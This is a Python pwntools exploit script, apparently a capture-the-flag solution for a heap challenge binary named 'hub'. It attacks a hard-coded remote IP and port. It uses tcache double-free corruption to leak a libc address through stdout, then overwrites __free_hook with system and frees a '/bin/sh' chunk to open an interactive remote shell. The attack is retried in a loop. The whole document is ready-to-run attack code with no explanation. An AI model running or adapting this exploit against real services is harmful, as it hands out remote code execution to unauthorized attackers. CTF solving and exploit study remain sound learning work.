from pwn import *
local = 0
elf=ELF("./hub")
context.terminal=["tmux","splitw","-h"]
def debug():
    gdb.attach(a,'''
    b *(0x000000000400A5E)
    b *0x000000000400972
    ''')
def menu(idx):
    a.recvuntil("Quit\n>>")
    a.sendline(str(idx))

def add(size,flag=True):
    menu(1)
    if flag:
        a.sendafter("stay?\n",str(size))
    else:
        a.sendafter("ay?",str(size))
def delete(idx,flag=True):
    menu(2)
    if flag:
        a.sendlineafter("Which hub don't you want?\n",str(idx))
    else:
        a.sendafter("Which hub don't you want?",str(idx))
def edit(s,flag=True):
    menu(3)
    if flag:
        a.sendafter("What do you want?\n",s)
    else:
        a.sendafter("ant?",s)
while 1:
    try:
        a=remote("47.112.139.218",13132)
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
        
        add(0x78)
        delete(0)
        delete(0)
        add(0x78)
        edit(p64(0x000000000602020))
        add(0x78)
        add(0x78)
        add(0x78)
        edit(p64(0xfbad1800))

        add(0x88,False)

        #delete(0)
        for i in range(7):
            delete(0,False)
        #debug()
        add(0x18,False)
        #debug()
        add(0x88,False)
        for i in range(2):
            delete(0,False)
        add(0x18,False)
        #debug()
        edit('\x80\x77',False)
        add(0x88,False)
        add(0x88,False)
        puts_got=elf.got["puts"]
        edit('\x68',False)

        #libc_base=u64(a.recv(6).ljust(8,'\x00'))-libc.symbols["puts"]
        libc_base = u64(a.recv(6).ljust(8,'\x00')) - libc.symbols["_IO_2_1_stdout_"]-131
        success("libc_base ==> 0x%x"%libc_base)

        __free_hook=libc_base+libc.symbols["__free_hook"]
        add(0x38,False)
        delete(0,False)
        delete(0,False)
        add(0x38,False)
        edit(p64(__free_hook),False)
        add(0x38,False)
        add(0x38,False)
        edit(p64(libc_base+libc.symbols["system"]),False)
        add(0x28,False)
        edit("/bin/sh\x00",False)
        delete(0,False)
        a.interactive()
    except Exception :
        a.close()
        continue
